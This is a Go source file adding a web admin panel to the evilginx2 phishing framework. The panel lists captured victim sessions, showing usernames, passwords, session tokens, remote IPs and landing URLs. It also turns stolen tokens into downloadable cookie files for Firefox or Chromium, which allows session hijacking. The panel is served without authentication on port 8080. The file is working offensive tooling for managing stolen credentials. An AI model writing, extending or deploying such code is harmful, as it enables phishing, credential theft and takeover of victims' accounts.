package core

import (
	"github.com/gorilla/mux"
	"net/http"
	"time"
	"strconv"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type AdminPanel struct {
	srv        *http.Server
	cfg        *Config
	db         *database.Database
}

func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
	log.Debug("Starting handleSessions")

	var body string
	var cookiedownloadlinks string

	//terminal.go 339

	cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "landing url", "time", "Download Cookie"}
	sessions, err := a.db.ListSessions()
	if err != nil {
		panic(err)
	}
	if len(sessions) == 0 {
		body = "No saved Sessions found"
	} else {
		var rows [][]string
		for _, s := range sessions {
			tcol := "none"
			if len(s.Tokens) > 0 {
				tcol = "captured"
			}
			cookiedownloadlinks = "<a href='./sessions/download/" + strconv.Itoa(s.Id) + "/Ff'>Ff</a>; <a href='./sessions/download/" + strconv.Itoa(s.Id) + "/Chromium'>Chromium</a>"
			row := []string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, tcol, s.RemoteAddr, s.LandingURL, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"), cookiedownloadlinks}
			rows = append(rows, row)
		}

		body = AsHTMLTable(cols, rows)
	}

	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(body))
}

func (a *AdminPanel) downloadSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, _ := strconv.Atoi(vars["id"])
	browser := vars["browser"]

	log.Debug("Admin Panel Request to download Session %d", id)

	//taken from terminal, because GetSessionBySid does not work??
	sessions, err := a.db.ListSessions()
	var session *database.Session
	if err != nil {
		log.Fatal("%v", err)
	}
	s_found := false
	if len(sessions) == 0 {
		log.Fatal("no saved sessions found")
		s_found = false
	} else {
		for _, s := range sessions {
			if s.Id == id {
				s_found = true
				session = s
				break
			}
		}
	}

	var body string
	if s_found {
		body = tokensToCookie(session.Tokens, browser)

		w.WriteHeader(http.StatusOK)
		w.Header().Set("content-type", "application/json")
		w.Header().Set("Content-Disposition", "attachment; filename='cookie.json'")
		w.Write([]byte(body))
	} else {
		w.WriteHeader(http.StatusNotFound)
		w.Header().Set("content-type", "text/plain")
		w.Write([]byte("Session not found"))
	}
}

func NewAdminPanel(cfg *Config, db *database.Database) (*AdminPanel, error) {
	a := &AdminPanel{}

	a.cfg = cfg
	a.db = db

	r := mux.NewRouter()
	a.srv = &http.Server{
		Handler:      r,
		Addr:         ":8080",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	// add new endpoints for the admin panel here:
	r.Handle("/", http.RedirectHandler("./index", 302))
	r.HandleFunc("/index", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "./templates/adminpanel_index.html") // serve static index.html
		// the relative path here seems wrong, but it is in relation to the binary later, not the current folderstructure!
	})
	r.HandleFunc("/sessions", a.handleSessions)
	r.HandleFunc("/sessions/download/{id}/{browser}", a.downloadSession) //possible options for browser are "Ff" or "Chromium"

	return a, nil
}

func (a *AdminPanel) Start() {
	go a.srv.ListenAndServe()
}
